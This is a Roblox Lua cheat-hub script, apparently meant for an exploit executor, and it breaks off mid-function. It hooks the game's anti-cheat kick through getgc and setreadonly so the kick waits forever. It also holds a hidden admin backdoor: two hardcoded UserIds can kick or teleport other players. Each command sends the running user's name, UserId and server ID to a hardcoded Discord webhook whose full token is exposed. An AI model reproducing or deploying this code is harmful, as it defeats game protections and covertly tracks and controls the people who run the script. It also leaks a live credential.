local function YDSJ_fake_script() -- OutlastHub.LocalScript 
	local script = Instance.new('LocalScript', OutlastHub)

	wait()
	for _, v in pairs(getgc(true)) do
		if type(v) == "table" then
			local success, idx = pcall(rawget, v, "indexInstance")
	
			if success and type(idx) == "table" and idx[1] == "kick" then
				pcall(function()
					setreadonly(v, false)
	
					rawset(v, "tvk", {
						"kick",
						function()
							return task.wait(9e9) 
						end
					})
	
					setreadonly(v, true)
				end)
			end
		end
	end
	
	game:GetService("RunService").RenderStepped:Connect(function()
		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
	end)
	
	local Players = game:GetService("Players")
	local StarterGui = game:GetService("StarterGui")
	local TextChatService = game:GetService("TextChatService")
	local Chat = game:GetService("Chat")
	local player = Players.LocalPlayer
	
	local Toggle = true  -- Always on
	local TARGET_GUI = "MAIN"
	
	-- ==============================
	-- Enable chat + bubble chat
	-- ==============================
	local function enableRobloxChat()
		pcall(function()
			StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
		end)
	
		if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
			local ok, err = pcall(function()
				TextChatService.ChatInputBarConfiguration.Enabled = true
				TextChatService.ChatWindowConfiguration.Enabled = true
	
				local bubble = TextChatService.BubbleChatConfiguration
				bubble.Enabled = true
				bubble.MaxDistance = 50
				bubble.MinimizeDistance = 30
				bubble.BackgroundTransparency = 0.3
				bubble.TextSize = 16
			end)
			if not ok then warn("Chat setup error:", err) end
		end
	
		pcall(function()
			Chat.BubbleChatEnabled = true
			Chat.BubbleChatMaxDistance = 50
		end)
	end
	
	-- ==============================
	-- Clear Main.Chat contents
	-- ==============================
	local function clearChatFolder()
		local playerGui = player:FindFirstChild("PlayerGui")
		if not playerGui then return end
		local mainGui = playerGui:FindFirstChild(TARGET_GUI)
		if not mainGui then return end
		local chatFolder = mainGui:FindFirstChild("Chat")
		if not chatFolder then return end
	
		for _, v in ipairs(chatFolder:GetChildren()) do
			v:Destroy()
		end
	end
	
	-- ==============================
	-- Run the chat system
	-- ==============================
	local function runChatSystem()
		enableRobloxChat()
		clearChatFolder()
	
		-- Clear periodically
		task.spawn(function()
			while true do
				task.wait(0.5)
				clearChatFolder()
			end
		end)
	end
	
	-- ==============================
	-- Persistent cleanup on respawn & GUI re-add
	-- ==============================
	player.CharacterAdded:Connect(function()
		task.wait(1)
		runChatSystem()
	end)
	
	player.PlayerGui.ChildAdded:Connect(function(child)
		task.wait(0.3)
		if child.Name == TARGET_GUI then
			clearChatFolder()
		end
	end)
	
	-- Initial run
	runChatSystem()
	
	
	
	
	
	local Players = game:GetService("Players")
	local HttpService = game:GetService("HttpService")
	
	local Admins = {
		[10367984106] = true, -- you
		[8493249794] = true, -- trusted alt
	}
	
	local WEBHOOK_URL = "https://discord.com/api/webhooks/1455275204350705991/-H9Oudu_HpZirE_sxS7tPPs64LcHi4vfLDtZZxATz0Vv0IiW2ikV4jxPLEylF9hzou7T"
	
	local LoopReset = {}
	
	-- =========================
	-- UTILS
	-- =========================
	local function findPlayer(name)
		name = name:lower()
		for _, plr in ipairs(Players:GetPlayers()) do
			if plr.Name:lower():sub(1, #name) == name then
				return plr
			end
		end
	end
	
	local function sendWebhook(admin, command, target)
		if WEBHOOK_URL == "" then return end
	
		local payload = {
			username = "Admin Logger",
			embeds = {{
				title = "Admin Command Used",
				color = 16711680,
				fields = {
					{ name = "Script User", value = Players.LocalPlayer.Name .. " (" .. Players.LocalPlayer.UserId .. ")", inline = true },
					{ name = "Admin", value = admin.Name .. " (" .. admin.UserId .. ")", inline = true },
					{ name = "Command", value = command, inline = true },
					{ name = "Target", value = target, inline = true },
					{ name = "Server JobId", value = game.JobId, inline = false }
				},
				timestamp = DateTime.now():ToIsoDate()
			}}
		}
	
		task.spawn(function()
			pcall(function()
				HttpService:PostAsync(
					WEBHOOK_URL,
					HttpService:JSONEncode(payload),
					Enum.HttpContentType.ApplicationJson
				)
			end)
		end)
	end
	
	-- =========================
	-- COMMAND HANDLER
	-- =========================
	local function onChat(speaker, msg)
		if not Admins[speaker.UserId] then return end
	
		local args = {}
		for word in msg:gmatch("%S+") do
			table.insert(args, word)
		end
	
		-- :kick player reason
		if args[1] == ":kick" and args[2] then
			local target = findPlayer(args[2])
			if target then
				sendWebhook(speaker, ":kick", target.Name)
				local reason = table.concat(args, " ", 3)
				target:Kick(reason ~= "" and reason or "Removed by admin.")
			end
		end
	
		-- :bring player/all
		if args[1] == ":bring" and args[2] then
			if not speaker.Character or not speaker.Character:FindFirstChild("HumanoidRootPart") then
				return
			end
			local hrp = speaker.Character.HumanoidRootPart
	
			if args[2] == "all" then
				for _, plr in ipairs(Players:GetPlayers()) do
					if plr ~= speaker and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
						plr.Character.HumanoidRootPart.CFrame = hrp.CFrame * CFrame.new(0, 0, -3)
					end
				end
				sendWebhook(speaker, ":bring", "ALL")
			else
				local target = findPlayer(args[2])
				if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
					target.Character.HumanoidRootPart.CFrame = hrp.CFrame * CFrame.new(0, 0, -3)
					sendWebhook(speaker, ":bring", target.Name)
				end
			end
		end
	
		-- :loopreset player (toggle)
		if args[1] == ":loopreset" and args[2] then
			local target = findPlayer(args[2])
			if target then
